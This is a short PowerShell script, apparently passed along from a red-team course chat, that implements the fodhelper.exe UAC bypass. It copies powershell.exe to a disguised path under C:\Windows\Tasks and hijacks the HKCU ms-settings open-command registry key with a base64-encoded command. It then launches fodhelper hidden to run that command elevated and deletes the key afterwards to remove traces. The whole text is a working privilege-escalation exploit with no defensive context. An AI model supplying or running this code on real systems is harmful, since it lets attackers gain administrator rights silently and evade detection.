//not mine init5's from the RTO slack :)

function RegShit {
    $cmd = "C:\Windows\Tasks\foo.exe -enc dwBoAG8AYQBtAGkAIAAvAGEAbABsACAAPgAgAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGEAcwBrAHMAXABvAG8AcABzAC4AdAB4AHQA"
    copy C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe C:\Windows\Tasks\foo.exe
    Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force -ErrorAction SilentlyContinue
    New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
    New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
    Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $cmd -Force
}
function PrivEsc {
    Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
    Start-Sleep -s 3
    Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force -ErrorAction SilentlyContinue
}
RegShit
